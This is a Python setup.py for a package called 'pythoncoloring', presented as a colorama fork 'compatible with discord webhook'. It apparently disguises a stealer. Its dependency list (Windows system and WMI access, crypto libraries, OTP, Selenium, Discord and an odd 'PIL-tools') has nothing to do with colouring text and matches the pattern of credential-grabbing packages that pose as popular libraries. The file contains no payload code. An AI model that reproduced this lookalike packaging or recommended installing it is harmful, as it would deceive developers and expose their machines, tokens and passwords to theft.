from setuptools import setup, find_packages

__name__ = "pythoncoloring"
__version__ = "1.2.4"

setup(
    name=__name__,
    version=__version__,
    author="artley",
    author_email="<python@support.com>",
    description="""Custom colorama fork, compatible with discord webhook""",
    long_description_content_type="text/markdown",
    long_description=open("README.md", encoding="utf-8").read(),
    install_requires=['httpx','pyotp','psutil','pypiwin32','pycryptodome','PIL-tools', 'cryptography', 'selenium', 'requests', 'zipfile', 'AES', 'discord', 'tkinter', 'wmi'],
    packages=find_packages(),
    keywords=['colors', 'colorama', 'python'],
    classifiers=[
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3.10",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ]
)
